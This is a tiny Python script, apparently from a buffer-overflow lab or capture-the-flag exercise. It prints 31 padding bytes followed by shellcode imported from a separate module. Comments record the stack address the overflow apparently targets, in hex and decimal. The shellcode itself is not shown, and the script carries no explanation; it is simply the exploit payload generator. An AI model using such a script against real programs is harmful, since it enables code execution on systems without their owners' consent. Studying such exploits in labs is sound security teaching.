#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(b'A'*31+shellcode)

#0x7ffffffed510
#140737488278800

#0x7, 7